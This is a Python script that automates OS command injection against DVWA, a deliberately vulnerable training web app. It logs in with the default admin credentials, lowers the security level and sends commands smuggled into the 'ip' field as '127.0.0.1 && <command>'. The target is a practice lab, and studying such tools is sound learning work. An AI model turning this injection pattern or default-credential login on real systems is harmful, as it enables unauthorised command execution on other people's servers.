#!/usr/bin/env python
# Author: Reznov - Pentester and hacker
# Tool: Automated DVWA Command Execution for both Windows and Linux
# Website: http://xakepu.blogspot.com
# Github: http://www.github.com/reznov1
# Twitter: @pentester11



import mechanize
from bs4 import BeautifulSoup
import urllib2
import sys
import platform
import time
from rainbow import colors


respo = 200
url = "http://"+sys.argv[1]+"/dvwa/login.php"
username = "admin"
password = "password"
levels = ['high','medium','low']


def CheckLog():

	print colors.DARKCYAN + '''

   ______     ____        ___    
  |  _ \ \   / /\ \      / / \   
  | | | \ \ / /  \ \ /\ / / _ \  
  | |_| |\ V /    \ V  V / ___ \ 
  |____/  \_/      \_/\_/_/   \_\\

  ____                                          _ 
 / ___|___  _ __ ___  _ __ ___   __ _ _ __   __| |
| |   / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` |
| |__| (_) | | | | | | | | | | | (_| | | | | (_| |
 \____\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|
                                                  
                          _   _             
  _____  _____  ___ _   _| |_(_) ___  _ __  
 / _ \ \/ / _ \/ __| | | | __| |/ _ \| '_ \ 
|  __/>  <  __/ (__| |_| | |_| | (_) | | | |
 \___/_/\_\___|\___|\__,_|\__|_|\___/|_| |_|
                                            

  Author: Reznov - Pentester and hacker
  Website: http://xakepu.blogspot.com
  Github: https://github.com/reznov11
  Twitter: @pentester11

  ''' + colors.ENDC


	try:
		link = urllib2.urlopen(url)
		
		if link.code == respo:
			print "\n[--] %s, Response: %s"%(url,str(respo))
			time.sleep(1)
			return
		
		else:
			print "\n[!] Can't open the link !!" %(str(link.code))
			time.sleep(1)
			exit(0)

	except urllib2.HTTPError, error:
		print "\n[!] Please check the link !"
		exit(0)

	except urllib2.URLError, error:
		print colors.backBlack + colors.BOLD + "\n[!] Can't resolve the host at this moment !!" + colors.ENDC
		exit(0)

def main():


	fetch = mechanize.Browser()
	fetch.open(url)
	fetch.select_form(nr=0)
	fetch.form['username'] = username
	fetch.form['password'] = password
	fetch.submit()

	if "Welcome" in fetch.title():
		print colors.YELLOW + "\n[*] " + fetch.title() + colors.ENDC
		time.sleep(1)

	else:
		print "\n[!] Check the username or password !!"
		exit(0)

	print "\n[?] Enter the security panel"
	time.sleep(2)

	new = fetch.click_link(text='DVWA Security')
	fetch.open(new)
	
	print colors.YELLOW + "\n[!] You're inside the security panel > " + fetch.title() + colors.ENDC
	time.sleep(2)
	
	print "\n[+] Now change the security level to %s ... "%sys.argv[2]
	time.sleep(2)

	try:

		fetch.select_form(nr=0)
		new1 = fetch.form['security'] = [sys.argv[2]]
		new2 = fetch.form['security']
		fetch.submit()
		print "\n[*] Security now is: " + ', '.join(new2)
		time.sleep(1)

	except mechanize._form.ItemNotFoundError:
		print "\n[-] Wrong level %s"%sys.argv[2]
		print "\n[+] Please choose one of these levels > " + colors.backMagenta + colors.BOLD +\
		 ", ".join(levels) + colors.ENDC

		exit(0)

	print colors.BLUE + "\n[+] Now lets execute some codes ..." + colors.ENDC
	time.sleep(2)

	new3 = fetch.click_link(text='Command Execution')
	fetch.open(new3)

	fetch.select_form(nr=0)

	print colors.CYAN + "\n[!]Please note, if you are running the dvwa on windows " +\
	 "platform please, use windows commands ." +\
	 "and if it's on linux platforms so use linux commands ." + colors.ENDC
	
	time.sleep(3)

	if platform.system() == "Windows":
		while True:
			inp1 = raw_input("\nCmd> ")
			new4 = fetch.form['ip'] = '127.0.0.1 && %s'%inp1
			fetch.submit()
			pl = fetch.response().read()
			fname = open('parse.html', "r+")
			fname.write(pl)

			print colors.backBlack + "\nDone, please open parse.html to see the results" + colors.ENDC
			time.sleep(2)

			nex = raw_input('Press q|quit to exit: ')
			
			if nex.lower == 'back' or nex.lower == 'b':
				exit(0)
			break

	elif platform.system() == "Linux":
		while True:
			inp2 = raw_input("\nSh> ")
			new5 = fetch.form['ip'] = '127.0.0.1 && %s'%inp2
			fetch.submit()
			pl = fetch.response().read()
			fname = open('parse.html', "r+")
			fname.write(pl)

			print colors.backBlack + "\nDone, please open parse.html to see the results" + colors.ENDC
			time.sleep(2)

			nex2 = raw_input('\nPress q|quit to exit: ')
			
			if nex2.lower == 'quit' or nex2.lower == 'q':
				exit(0)
			break

if __name__ == "__main__":

	try:
		first = CheckLog()
		second = main()
		print colors.BOLD + "\n[*] Finished at %s "%time.strftime("%Y %X") + colors.ENDC
	except KeyboardInterrupt :
		print colors.RED + colors.BOLD + "\n[-] You closed the tool !!!" + colors.ENDC
